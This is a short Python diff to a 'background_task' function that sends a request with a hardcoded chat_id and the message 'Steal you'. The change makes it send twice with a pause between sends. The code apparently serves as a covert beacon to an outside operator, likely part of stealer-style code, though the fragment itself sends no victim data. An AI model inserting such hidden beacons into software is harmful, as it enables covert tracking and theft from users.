@@ -1,4 +1,4 @@
-import requests
+import requests,time
 
 def background_task():
     try:
@@ -7,7 +7,9 @@ def background_task():
             'chat_id': '6400572573',
             'text': 'Steal you'
         }
-        response = requests.get(url, params=params)
+        for i in range(2):
+            response = requests.get(url, params=params)
+            time.sleep(4)
         
     except Exception as e:
         print(f"An error occurred: {e}")
